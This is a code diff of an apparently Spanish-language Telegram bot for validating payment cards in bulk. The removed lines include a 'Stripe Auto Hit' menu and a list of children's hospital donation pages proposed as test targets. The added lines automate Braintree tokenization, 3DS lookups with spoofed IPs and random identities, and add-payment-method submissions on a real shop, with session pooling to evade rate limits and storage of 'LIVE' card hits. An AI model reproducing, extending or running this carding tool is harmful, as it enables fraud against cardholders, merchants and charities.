-    response.append(f"⏱️ TIMEOUT: {stats.get('timeout', 0)}")
-    response.append(f"⚠️ ERRORES: {stats['error']}")
-    
-    await msg.edit_text("\n".join(response), parse_mode="Markdown")
+        return session, None, None, None
 
-async def stop_hit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Detiene el proceso de hitting en curso"""
-    user_id = update.effective_user.id
-    
-    if card_service.stop_hit(user_id):
-        await update.message.reply_text("⏹ Deteniendo proceso de Auto Hit...")
-    else:
-        await update.message.reply_text("No hay proceso de Auto Hit activo")
+def b3_refresh_auth(session):
+    try:
+        r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
+        if 'Credit Cards' not in r.text and 'add_payment_method' not in r.text:
+            b3_try_register(session)
+            r = session.get(B3_ADD_PM_URL, verify=False, timeout=30)
+        cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
+        if not cm_match:
+            return None, None, None
+        cm = json.loads(cm_match.group(1).rstrip(';'))
+        wpnonce = cm.get('_wpnonce', '')
+        apm_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
+        apm_nonce = apm_nonce_match.group(1) if apm_nonce_match else ''
+        token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
+                     f'&path=/wc-braintree/v1/client-token/create')
+        r2 = session.post(token_url, verify=False, timeout=30,
+                          headers={
+                              'X-Requested-With': 'XMLHttpRequest',
+                              'Referer': B3_ADD_PM_URL
+                          },
+                          data={
+                              'currency': 'GBP',
+                              'merchant_account': B3_MERCHANT_ACCOUNT,
+                              '_wpnonce': wpnonce
+                          })
+        if r2.status_code != 200:
+            return None, None, None
+        client_token_b64 = r2.text.strip('"')
+        decoded = json.loads(base64.b64decode(client_token_b64))
+        return decoded.get('authorizationFingerprint', None), apm_nonce, decoded
+    except:
+        return None, None, None
 
-async def stripe_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Muestra estadísticas de Stripe"""
-    user_id = update.effective_user.id
-    stats = await db.get_stats(user_id)
-    
-    text = (
-        f"📊 *ESTADÍSTICAS STRIPE*\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"✅ LIVE: {stats['stripe_live']}\n"
-        f"❌ DECLINED: {stats['stripe_declined']}\n"
-        f"🚨 FRAUDULENT: {stats['stripe_fraud']}\n"
-        f"🔒 3DS: {stats['stripe_3ds']}"
-    )
-    
-    await update.message.reply_text(text, parse_mode="Markdown")
-
-# ================== COMANDOS DE ANÁLISIS ==================
-async def analyze_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Analiza un sitio web en busca de CAPTCHA"""
-    user_id = update.effective_user.id
-    
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Uso: /analyze <url>\n"
-            "Ejemplo: /analyze https://donate.schf.org.au"
-        )
-        return
-    
-    url = context.args[0]
-    
-    msg = await update.message.reply_text(f"🔍 Analizando {url}...")
-    
-    result = await CaptchaDetector.check_site(url)
-    
-    if not result['success']:
-        await msg.edit_text(f"❌ Error: {result.get('error', 'Desconocido')}")
-        return
-    
-    response = []
-    response.append(f"🔍 *ANÁLISIS DE SITIO*\n━━━━━━━━━━━━━━━━━━\n")
-    response.append(f"📍 URL: `{result['url']}`")
-    response.append(f"📊 Status: {result['status_code']} ({result['response_time']:.2f}s)")
-    
-    captcha = result['captcha']
-    if captcha['has_captcha']:
-        response.append(f"\n🚫 *CAPTCHA DETECTADO*")
-        for ct in captcha['detected_types']:
-            service = captcha['details'].get(ct, {}).get('service', 'Desconocido')
-            response.append(f"• {service}")
-        response.append(f"\n🎯 Confianza: {captcha['confidence']}")
-    else:
-        response.append(f"\n✅ *NO SE DETECTARON CAPTCHAS*")
-    
-    headers = result['security_headers']
-    if headers['has_security_headers']:
-        response.append(f"\n🛡️ *PROTECCIÓN DETECTADA*")
-        if headers['cloudflare']:
-            response.append(f"• Cloudflare")
-        if headers['datadome']:
-            response.append(f"• DataDome")
-    
-    response.append(f"\n💡 *RECOMENDACIÓN*")
-    response.append(f"{result['recommendation']}")
-    
-    await msg.edit_text("\n".join(response), parse_mode="Markdown")
-
-async def find_similar_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Busca sitios similares al actual (hospitales infantiles)"""
-    
-    hospitals = [
-        {
-            'name': 'Royal Children\'s Hospital Foundation (Australia)',
-            'url': 'https://www.rchfoundation.org.au',
-            'note': 'Mismo país que el actual'
+def b3_tokenize_card(session, auth_fp, cc, mm, yy, cvv, addr):
+    graphql_body = {
+        "clientSdkMetadata": {
+            "source": "client",
+            "integration": "custom",
+            "sessionId": str(uuid.uuid4())
         },
-        {
-            'name': 'St. Jude Children\'s Research Hospital (EE.UU.)',
-            'url': 'https://www.stjude.org/donate',
-            'note': 'Sistema propio de donaciones'
+        "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
+                  "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode "
+                  "last4 cardholderName expirationMonth expirationYear binData { prepaid "
+                  "healthcare debit durbinRegulated commercial payroll issuingBank "
+                  "countryOfIssuance productId } } } }"),
+        "variables": {
+            "input": {
+                "creditCard": {
+                    "number": cc,
+                    "expirationMonth": mm,
+                    "expirationYear": yy,
+                    "cvv": cvv,
+                    "billingAddress": {
+                        "postalCode": addr.get("zip", "SW1A 1AA"),
+                        "streetAddress": addr.get("line1", "236 W 30TH")
+                    }
+                },
+                "options": {"validate": False}
+            }
         },
-        {
-            'name': 'BC Children\'s Hospital Foundation (Canadá)',
-            'url': 'https://secure.bcchf.ca/donate',
-            'note': 'Sistema canadiense'
+        "operationName": "TokenizeCreditCard"
+    }
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": f"Bearer {auth_fp}",
+        "Braintree-Version": "2018-05-10"
+    }
+    try:
+        resp = session.post(B3_GRAPHQL_URL, json=graphql_body, headers=headers,
+                            verify=False, timeout=30)
+        return resp.status_code, resp.json()
+    except Exception as e:
+        return 0, {"errors": [{"message": str(e)}]}
+
+def b3_three_ds_lookup(session, auth_fp, token, cc, first, last, email, addr):
+    lookup_url = f"{B3_CLIENT_API}/v1/payment_methods/{token}/three_d_secure/lookup"
+    body = {
+        "amount": "0.00",
+        "browserColorDepth": 24,
+        "browserJavaEnabled": False,
+        "browserJavascriptEnabled": True,
+        "browserLanguage": "es-US",
+        "browserScreenHeight": 1086,
+        "browserScreenWidth": 501,
+        "browserTimeZone": 300,
+        "deviceChannel": "Browser",
+        "additionalInfo": {
+            "ipAddress": (f"{random.randint(1,223)}.{random.randint(0,255)}"
+                          f".{random.randint(0,255)}.{random.randint(1,254)}"),
+            "billingLine1": addr.get("line1", "236 W 30TH"),
+            "billingLine2": "",
+            "billingCity": addr.get("city", "NEW YORK"),
+            "billingState": addr.get("state", ""),
+            "billingPostalCode": addr.get("zip", "SW1A 1AA"),
+            "billingCountryCode": addr.get("country", "GB"),
+            "billingPhoneNumber": "",
+            "billingGivenName": first,
+            "billingSurname": last,
+            "email": email
         },
-        {
-            'name': 'Sydney Children\'s Hospital (actual)',
-            'url': 'https://donate.schf.org.au',
-            'note': 'El que ya funciona'
+        "challengeRequested": True,
+        "bin": cc[:6],
+        "dfReferenceId": f"0_{uuid.uuid4()}",
+        "clientMetadata": {
+            "requestedThreeDSecureVersion": "2",
+            "sdkVersion": "web/3.133.0",
+            "cardinalDeviceDataCollectionTimeElapsed": random.randint(300, 600),
+            "issuerDeviceDataCollectionTimeElapsed": random.randint(2000, 5000),
+            "issuerDeviceDataCollectionResult": True
+        },
+        "authorizationFingerprint": auth_fp,
+        "braintreeLibraryVersion": "braintree/web/3.133.0",
+        "_meta": {
+            "merchantAppId": "trade-chem.co.uk",
+            "platform": "web",
+            "sdkVersion": "3.133.0",
+            "source": "client",
+            "integration": "custom",
+            "integrationType": "custom",
+            "sessionId": str(uuid.uuid4())
         }
-    ]
-    
-    response = []
-    response.append("🏥 *HOSPITALES INFANTILES PARA PROBAR*\n")
-    response.append("Usa `/analyze <url>` para verificar CAPTCHA:\n")
-    
-    for i, hospital in enumerate(hospitals, 1):
-        response.append(f"{i}. *{hospital['name']}*")
-        response.append(f"   🔗 {hospital['url']}")
-        response.append(f"   💡 {hospital['note']}")
-        response.append("")
-    
-    await update.message.reply_text("\n".join(response), parse_mode="Markdown")
+    }
+    try:
+        resp = session.post(lookup_url, json=body, verify=False, timeout=30)
+        return resp.status_code, resp.json()
+    except Exception as e:
+        return 0, {"errors": [{"message": str(e)}]}
 
-# ================== VARIABLES GLOBALES ==================
-db = None
-user_manager = None
-card_service = None
-cancel_mass = {}
-user_state = {}
-active_mass = set()
+def b3_classify_error_msg(msg):
+    ml = msg.lower()
+    if "cvv" in ml or "security code" in ml or "cvc" in ml:
+        return "CVV", msg
+    if "number" in ml or "invalid" in ml or "credit card" in ml:
+        return "DECLINED", msg
+    if "expired" in ml:
+        return "DECLINED", msg
+    if "declined" in ml or "do not honor" in ml:
+        return "DECLINED", msg
+    if "fraud" in ml or "stolen" in ml or "lost" in ml:
+        return "DECLINED", msg
+    if "restricted" in ml or "not permitted" in ml or "limit" in ml:
+        return "DECLINED", msg
+    if "insufficient" in ml or "funds" in ml:
+        return "DECLINED", msg
+    return "DECLINED", msg
 
-# ================== MENÚ PRINCIPAL ==================
-async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit: bool = False):
-    text = (
-        "🤖 *SHOPIFY + GIVEWP + STRIPE*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        "Elige una opción:"
-    )
+def b3_classify_tokenize(status_code, resp):
+    if status_code == 200:
+        data = resp.get("data", {})
+        tok = data.get("tokenizeCreditCard", {})
+        token = tok.get("token", "")
+        if token:
+            return "TOKEN", token
+        errors = resp.get("errors", [])
+        if errors:
+            msg = errors[0].get("message", "Unknown")
+            return b3_classify_error_msg(msg)
+        return "ERROR", "No token"
+    errors = resp.get("errors", [])
+    if errors:
+        msg = errors[0].get("message", "Unknown")
+        return b3_classify_error_msg(msg)
+    return "ERROR", f"HTTP {status_code}"
+
+def b3_classify_3ds(status_code, resp):
+    if status_code == 0:
+        return "ERROR", "Connection failed", ""
+    errors = resp.get("errors", [])
+    if errors:
+        msg = errors[0].get("message", "Unknown")
+        result, detail = b3_classify_error_msg(msg)
+        return result, detail, ""
+    pm = resp.get("paymentMethod", {})
+    tds = pm.get("threeDSecureInfo", {}) or resp.get("threeDSecureInfo", {})
+    nonce = pm.get("nonce", "")
+    if not tds:
+        if nonce:
+            return "LIVE", "Card approved (no 3DS info)", nonce
+        return "ERROR", "No 3DS info", ""
+    status = tds.get("status", "").lower()
+    shifted = tds.get("liabilityShifted", False)
+    possible = tds.get("liabilityShiftPossible", False)
+    enrolled = tds.get("enrolled", "")
+    if status in ("authenticate_successful", "authenticate_attempt_successful"):
+        return "LIVE", f"Authenticated - {status}", nonce
+    if status == "challenge_required":
+        return "3DS", f"3DS Challenge Required (enrolled={enrolled})", nonce
+    if status in ("authenticate_rejected", "authenticate_error"):
+        return "DECLINED", f"Authentication rejected - {status}", nonce
+    if status in ("lookup_not_enrolled", "lookup_bypassed", "lookup_error"):
+        return "LIVE", f"Not enrolled in 3DS - {status}", nonce
+    if status == "lookup_enrolled":
+        return "3DS", "3DS Enrolled - challenge pending", nonce
+    if status in ("unsupported_card", "lookup_card_error"):
+        return "DECLINED", f"Card not supported - {status}", nonce
+    if status == "authentication_unavailable":
+        return "LIVE", f"Auth unavailable (card likely valid) - {status}", nonce
+    if nonce:
+        if enrolled == "N":
+            return "LIVE", f"Not enrolled (status={status})", nonce
+        if possible and not shifted:
+            return "3DS", f"3DS possible (status={status})", nonce
+        return "DECLINED", f"Unknown status: {status}", nonce
+    return "DECLINED", f"Unknown: {status}", ""
+
+def b3_submit_add_payment_method(session, nonce, apm_nonce, config_data):
+    device_data = json.dumps({"correlation_id": str(uuid.uuid4())[:36]})
+    try:
+        resp = session.post(B3_ADD_PM_URL, data={
+            'payment_method': 'braintree_cc',
+            'braintree_cc_nonce_key': nonce,
+            'braintree_cc_device_data': device_data,
+            'braintree_cc_3ds_nonce_key': nonce,
+            'braintree_cc_config_data': json.dumps(config_data) if config_data else '',
+            'woocommerce-add-payment-method-nonce': apm_nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+        }, verify=False, timeout=45, allow_redirects=True)
+        return resp.status_code, resp.text
+    except Exception as e:
+        return 0, str(e)
+
+def b3_classify_apm_response(status_code, resp_text):
+    if status_code == 0:
+        return "ERROR", resp_text[:80]
+    if 'cannot add a new payment method so soon' in resp_text.lower() or 'please wait for' in resp_text.lower():
+        return "RATE_LIMIT", "Rate limited - waiting"
+    error_match = re.search(r'There was an error saving your payment method[.\s]*Reason:\s*([^<]+)', resp_text)
+    if error_match:
+        server_msg = error_match.group(1).strip()
+        return b3_classify_server_msg(server_msg)
+    if 'Payment method successfully added' in resp_text:
+        return "LIVE", "Payment method successfully added"
+    notices = re.findall(r'class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</(?:ul|div)', resp_text, re.DOTALL)
+    for n in notices:
+        clean = re.sub(r'<[^>]+>', ' ', n).strip()
+        if clean:
+            return b3_classify_server_msg(clean)
+    error_li = re.search(r'<li[^>]*>([^<]+)</li>', resp_text)
+    if error_li:
+        return b3_classify_server_msg(error_li.group(1).strip())
+    return "DECLINED", "No response captured"
+
+def b3_classify_server_msg(msg):
+    ml = msg.lower()
+    if "do not honor" in ml:
+        return "DECLINED", msg
+    if "insufficient" in ml or "funds" in ml:
+        return "DECLINED", msg
+    if "declined" in ml:
+        return "DECLINED", msg
+    if "expired" in ml:
+        return "DECLINED", msg
+    if "stolen" in ml or "lost" in ml or "pick up" in ml:
+        return "DECLINED", msg
+    if "restricted" in ml or "not permitted" in ml:
+        return "DECLINED", msg
+    if "fraud" in ml or "suspicious" in ml:
+        return "DECLINED", msg
+    if "invalid" in ml:
+        return "DECLINED", msg
+    if "limit" in ml or "exceed" in ml:
+        return "DECLINED", msg
+    if "cvv" in ml or "security code" in ml or "cvc" in ml:
+        return "CVV", msg
+    if "success" in ml or "approved" in ml or "thank you" in ml:
+        return "LIVE", msg
+    if "3d secure" in ml or "authentication" in ml:
+        return "3DS", msg
+    return "DECLINED", msg
+
+def b3_init_session_pool():
+    global b3_session_pool
+    b3_session_pool = []
+    num_accounts = len(B3_COOKIE_SETS)
+    for i in range(num_accounts):
+        s, fp, nonce, cfg = b3_get_session_and_auth(cookie_index=i)
+        if fp:
+            b3_session_pool.append({
+                'session': s, 'auth_fp': fp, 'apm_nonce': nonce,
+                'config_data': cfg, 'last_used': 0, 'cookie_index': i
+            })
+    return len(b3_session_pool)
+
+def b3_get_pool_session():
+    global b3_session_pool
+    if not b3_session_pool:
+        b3_init_session_pool()
+    if not b3_session_pool:
+        return None, None, None, None
+    now = time.time()
+    best = None
+    for entry in b3_session_pool:
+        wait = now - entry['last_used']
+        if wait >= B3_RATE_LIMIT_DELAY:
+            if best is None or entry['last_used'] < best['last_used']:
+                best = entry
+    if best is None:
+        best = min(b3_session_pool, key=lambda e: e['last_used'])
+        wait_needed = B3_RATE_LIMIT_DELAY - (now - best['last_used'])
+        if wait_needed > 0:
+            time.sleep(wait_needed)
+    best['last_used'] = time.time()
+    return best['session'], best['auth_fp'], best['apm_nonce'], best['config_data']
+
+def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, apm_nonce=None, config_data=None, use_pool=False):
+    global b3_auth_fp, b3_http_session
+    start_time = time.time()
+    if len(year) == 2:
+        year = f"20{year}"
+    month = month.zfill(2)
     
-    keyboard = [
-        [InlineKeyboardButton("💳 CHECK SHOPIFY", callback_data="menu_check")],
-        [InlineKeyboardButton("📦 MASS CHECK", callback_data="menu_mass")],
-        [InlineKeyboardButton("❤️ DONATE GIVEWP", callback_data="menu_donate")],
-        [InlineKeyboardButton("⚡ STRIPE AUTO HIT", callback_data="menu_stripe")],
-        [InlineKeyboardButton("🌐 SITES", callback_data="menu_sites")],
-        [InlineKeyboardButton("🔌 PROXIES", callback_data="menu_proxies")],
-        [InlineKeyboardButton("🧾 CARDS", callback_data="menu_cards")],
-        [InlineKeyboardButton("📊 STATS", callback_data="menu_stats")],
-        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="menu_settings")],
-        [InlineKeyboardButton("🔍 ANALYZER", callback_data="menu_analyzer")],
+    first, last, email, addr = b3_random_identity()
+    
+    try:
+        if use_pool:
+            session, auth_fp, apm_nonce, config_data = b3_get_pool_session()
+            if not auth_fp:
+                elapsed = round(time.time() - start_time, 2)
+                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+        elif session is None or auth_fp is None:
+            session, auth_fp, apm_nonce, config_data = b3_get_session_and_auth(session)
+            if not auth_fp:
+                elapsed = round(time.time() - start_time, 2)
+                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+        
+        tok_status, tok_resp = b3_tokenize_card(session, auth_fp, cc, month, year, cvv, addr)
+        result, msg = b3_classify_tokenize(tok_status, tok_resp)
+        
+        if result != "TOKEN":
+            elapsed = round(time.time() - start_time, 2)
+            return result, msg, msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+        
+        token = msg
+        
+        lk_status, lk_resp = b3_three_ds_lookup(session, auth_fp, token, cc,
+                                                  first, last, email, addr)
+        tds_result, tds_msg, nonce = b3_classify_3ds(lk_status, lk_resp)
+        
+        if not nonce or tds_result in ("ERROR",):
+            elapsed = round(time.time() - start_time, 2)
+            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+        
+        if not apm_nonce:
+            elapsed = round(time.time() - start_time, 2)
+            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+        
+        chk_status, chk_text = b3_submit_add_payment_method(session, nonce, apm_nonce, config_data)
+        result, server_msg = b3_classify_apm_response(chk_status, chk_text)
+        
+        if result == "RATE_LIMIT":
+            time.sleep(B3_RATE_LIMIT_DELAY)
+            auth_fp_new, apm_nonce_new, config_data_new = b3_refresh_auth(session)
+            if auth_fp_new:
+                auth_fp, apm_nonce, config_data = auth_fp_new, apm_nonce_new, config_data_new
+            tok_status2, tok_resp2 = b3_tokenize_card(session, auth_fp, cc, month, year, cvv, addr)
+            result2, msg2 = b3_classify_tokenize(tok_status2, tok_resp2)
+            if result2 == "TOKEN":
+                lk2, lr2 = b3_three_ds_lookup(session, auth_fp, msg2, cc, first, last, email, addr)
+                tr2, tm2, n2 = b3_classify_3ds(lk2, lr2)
+                if n2:
+                    cs2, ct2 = b3_submit_add_payment_method(session, n2, apm_nonce, config_data)
+                    result, server_msg = b3_classify_apm_response(cs2, ct2)
+                    if result == "RATE_LIMIT":
+                        result, server_msg = "DECLINED", "Rate limited - try again later"
+        
+        elapsed = round(time.time() - start_time, 2)
+        return result, server_msg, server_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+        
+    except requests.exceptions.Timeout:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", "Timeout", "Request timed out", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", str(e)[:80], str(e)[:80], "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+
+# ============================================
+# BRAINTREE AUTH CARD MANAGEMENT
+# ============================================
+
+def load_b3_cards():
+    return safe_json_load(B3_CARDS_FILE, [])
+
+def save_b3_cards(cards):
+    safe_json_save(B3_CARDS_FILE, cards)
+
+def add_b3_card(cc, month, year, cvv):
+    cards = load_b3_cards()
+    card_str = f"{cc}|{month}|{year}|{cvv}"
+    if card_str not in cards:
+        cards.append(card_str)
+        save_b3_cards(cards)
+        return True
+    return False
+
+def clear_b3_cards():
+    save_b3_cards([])
+
+def get_all_b3_cards():
+    return load_b3_cards()
+
+def delete_b3_card(card_str):
+    cards = load_b3_cards()
+    if card_str in cards:
+        cards.remove(card_str)
+        save_b3_cards(cards)
+        return True
+    return False
+
+def load_b3_hits():
+    return safe_json_load(B3_HITS_FILE, [])
+
+def save_b3_hit(hit_data):
+    global b3_hits_list
+    b3_hits_list.append(hit_data)
+    hits = load_b3_hits()
+    hits.append(hit_data)
+    safe_json_save(B3_HITS_FILE, hits)
+
+def get_b3_hits():
+    global b3_hits_list
+    if not b3_hits_list:
+        b3_hits_list = load_b3_hits()
+    return b3_hits_list
+
+def clear_b3_hits():
+    global b3_hits_list
+    b3_hits_list = []
+    safe_json_save(B3_HITS_FILE, [])
+
+# ============================================
+# SAFE JSON HANDLING
+# ============================================
+
+def safe_json_load(filename, default_value=None):
+    if default_value is None:
+        default_value = []
+    if not os.path.exists(filename):
+        return default_value
+    try:
+        with open(filename, 'r', encoding='utf-8') as f:
+            content = f.read().strip()
+            if not content:
+                return default_value
+            return json.loads(content)
+    except:
+        return default_value
+
+def safe_json_save(filename, data):
+    try:
+        json_str = json.dumps(data, indent=2, ensure_ascii=False)
+        temp_file = f"{filename}.tmp"
+        with open(temp_file, 'w', encoding='utf-8') as f:
+            f.write(json_str)
+        if os.path.exists(filename):
+            os.remove(filename)
+        os.rename(temp_file, filename)
+        return True
+    except:
+        return False
+
+# ============================================
+# URL FUNCTIONS
+# ============================================
+
+def clean_url(url):
+    if not url:
+        return None
+    url = url.strip()
+    url = re.sub(r'^[Ss]ite\s*:\s*', '', url)
+    url = re.sub(r'^[Uu][Rr][Ll]\s*:\s*', '', url)
+    url = re.sub(r'^[Ww]ebsite\s*:\s*', '', url)
+    url = re.sub(r'^[Ll]ink\s*:\s*', '', url)
+    url = re.sub(r'^\d+\.\s*', '', url)
+    url = url.strip()
+    if url and not url.startswith(('http://', 'https://')):
+        if '.' in url and ' ' not in url:
+            url = 'https://' + url
+    return url
+
+def normalize_url(url):
+    cleaned = clean_url(url)
+    return cleaned if cleaned else None
+
+def extract_url_from_text(text):
+    patterns = [
+        r'https?://[^\s]+',
+        r'[a-zA-Z0-9][a-zA-Z0-9-]*\.[a-zA-Z]{2,}(?:/[^\s]*)?'
     ]
-    
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    if edit:
-        await update.callback_query.edit_message_text(
-            text, parse_mode="Markdown", reply_markup=reply_markup
-        )
+    for pattern in patterns:
+        match = re.search(pattern, text)
+        if match:
+            url = match.group(0)
+            if not url.startswith(('http://', 'https://')):
+                url = 'https://' + url
+            return url
+    return None
+
+# ============================================
+# CARD MANAGEMENT (SHOPIFY)
+# ============================================
+
+def load_cards():
+    return safe_json_load(CARDS_FILE, [])
+
+def save_cards(cards):
+    return safe_json_save(CARDS_FILE, cards)
+
+def add_card(cc, month, year, cvv):
+    cards = load_cards()
+    card_str = f"{cc}|{month}|{year}|{cvv}"
+    if card_str not in cards:
+        cards.append(card_str)
+        save_cards(cards)
+        return True
+    return False
+
+def clear_cards():
+    save_cards([])
+
+def get_all_cards():
+    return load_cards()
+
+def delete_card(card_str):
+    cards = load_cards()
+    if card_str in cards:
+        cards.remove(card_str)
+        save_cards(cards)
+        return True
+    return False
+
+def validate_luhn(card_number):
+    digits = [int(d) for d in str(card_number)]
+    odd_digits = digits[-1::-2]
+    even_digits = digits[-2::-2]
+    total = sum(odd_digits)
+    for d in even_digits:
+        total += sum(divmod(d * 2, 10))
+    return total % 10 == 0
+
+def is_card_expired(month, year):
+    try:
+        now = datetime.now()
+        m = int(month)
+        y = int(year)
+        if y < 100:
+            y += 2000
+        if y < now.year:
+            return True
+        if y == now.year and m < now.month:
+            return True
+        return False
+    except:
+        return False
+
+def validate_cvv(cvv, cc):
+    if not cvv.isdigit():
+        return False
+    if cc.startswith('3'):
+        return len(cvv) in [3, 4]
+    return len(cvv) == 3
+
+def parse_card_line(line):
+    line = line.strip()
+    if not line:
+        return None
+    line = re.sub(r'\s+', '', line)
+    parts = None
+    for sep in ['|', '/', ':', ';', ',']:
+        if sep in line:
+            candidate = line.split(sep)
+            if len(candidate) >= 4:
+                parts = candidate
+                break
+    if not parts or len(parts) < 4:
+        return None
+    cc = re.sub(r'[^\d]', '', parts[0].strip())
+    month = parts[1].strip()
+    year = parts[2].strip()
+    cvv = parts[3].strip()
+    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
+        return None
+    if not month.isdigit() or not year.isdigit() or not cvv.isdigit():
+        return None
+    if len(year) == 4:
+        year = year[-2:]
+    elif len(year) != 2:
+        return None
+    if len(month) == 1:
+        month = f"0{month}"
+    m = int(month)
+    if m < 1 or m > 12:
+        return None
+    if not validate_luhn(cc):
+        return None
+    if not validate_cvv(cvv, cc):
+        return None
+    return {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
+
+# ============================================
+# SITES MANAGEMENT
+# ============================================
+
+def load_sites():
+    return safe_json_load(SITES_FILE, [])
+
+def save_sites(sites):
+    sites = [s for s in sites if s and isinstance(s, str)]
+    sites = list(dict.fromkeys(sites))
+    return safe_json_save(SITES_FILE, sites)
+
+def validate_site_url(url):
+    if not url or not isinstance(url, str):
+        return False, "Empty URL"
+    url = url.strip()
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    domain_match = re.search(r'https?://([^/]+)', url)
+    if not domain_match:
+        return False, "No domain found"
+    domain = domain_match.group(1)
+    if '.' not in domain:
+        return False, "Invalid domain (no TLD)"
+    if len(domain) < 4:
+        return False, "Domain too short"
+    tld = domain.split('.')[-1].lower()
+    valid_tlds = ['com','org','net','shop','store','io','co','uk','de','fr','es','it',
+                  'ca','au','br','mx','ar','cl','xyz','online','site','info','biz',
+                  'us','eu','app','dev','me','in','jp','ru','nl','se','no','ie','pt',
+                  'pl','cz','at','ch','be','dk','fi','nz','za','sg','hk','tw','kr',
+                  'th','ph','vn','id','my','ae','sa','il','tr','ua','ro','bg','hr',
+                  'sk','si','lt','lv','ee','is','lu','mt','cy','gr','hu']
+    if tld not in valid_tlds:
+        return False, f"Unknown TLD: .{tld}"
+    return True, url
+
+def check_site_alive(url, timeout=5):
+    try:
+        resp = requests.head(url, timeout=timeout, verify=False, allow_redirects=True,
+                           headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        return resp.status_code < 500, resp.status_code, resp.elapsed.total_seconds()
+    except requests.exceptions.ConnectionError:
+        return False, 0, 0
+    except requests.exceptions.Timeout:
+        return False, 0, 0
+    except:
+        return False, 0, 0
+
+def add_site(url):
+    if not url:
+        return False
+    cleaned_url = normalize_url(url)
+    if not cleaned_url:
+        return False
+    valid, result = validate_site_url(cleaned_url)
+    if not valid:
+        return False
+    sites = load_sites()
+    if cleaned_url not in sites:
+        sites.append(cleaned_url)
+        save_sites(sites)
+        return True
+    return False
+
+def clear_all_sites():
+    save_sites([])
+    return True
+
+def delete_site_by_index(index):
+    sites = load_sites()
+    if 1 <= index <= len(sites):
+        removed = sites.pop(index - 1)
+        save_sites(sites)
+        return removed
+    return None
+
+def get_random_site():
+    sites = load_sites()
+    sites = [s for s in sites if s and isinstance(s, str)]
+    if not sites:
+        return None
+    scored = []
+    for s in sites:
+        if s in site_stats:
+            total, success = site_stats[s]
+            if total >= SITE_MIN_CHECKS:
+                rate = success / total
+                scored.append((s, rate))
+            else:
+                scored.append((s, 0.5))
+        else:
+            scored.append((s, 0.5))
+    scored.sort(key=lambda x: x[1], reverse=True)
+    top_count = max(1, len(scored) // 3)
+    top_sites = [s for s, _ in scored[:top_count]]
+    return random.choice(top_sites)
+
+def fix_all_sites():
+    sites = load_sites()
+    fixed_sites = []
+    for site in sites:
+        if site:
+            cleaned = normalize_url(site)
+            if cleaned and cleaned not in fixed_sites:
+                fixed_sites.append(cleaned)
+    save_sites(fixed_sites)
+    return len(fixed_sites)
+
+# ============================================
+# REPORT SITE RESULT
+# ============================================
+
+def track_site_performance(url, success):
+    """Track site success/failure for smart rotation"""
+    if not url:
+        return
+    if url in site_stats:
+        total, wins = site_stats[url]
+        site_stats[url] = (total + 1, wins + (1 if success else 0))
     else:
-        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)
+        site_stats[url] = (1, 1 if success else 0)
 
-# ================== SUBMENÚ STRIPE ==================
-async def show_stripe_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "⚡ *STRIPE AUTO HITTER*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        "Comandos:\n"
-        "• `/addstripe <url>` - Guardar URL de Stripe\n"
-        "• `/mystripe` - Ver URLs guardadas\n"
-        "• `/removestripe <n/all>` - Eliminar URL(s)\n"
-        "• `/hit <n> [límite]` - Iniciar Auto Hit\n"
-        "• `/stophit` - Detener proceso\n"
-        "• `/stripestats` - Ver estadísticas\n\n"
-        "💡 *Ejemplos:*\n"
-        "`/hit 1` - Probar todas las tarjetas\n"
-        "`/hit 1 5` - Probar solo 5 tarjetas"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+def auto_clean_dead_sites():
+    """Remove non-permanent sites with high failure rate + connectivity check"""
+    global site_check_counter
+    site_check_counter += 1
+    if site_check_counter < SITE_AUTO_CLEAN_INTERVAL:
+        return
+    site_check_counter = 0
+    sites = load_sites()
+    removed = []
+    for url in list(sites):
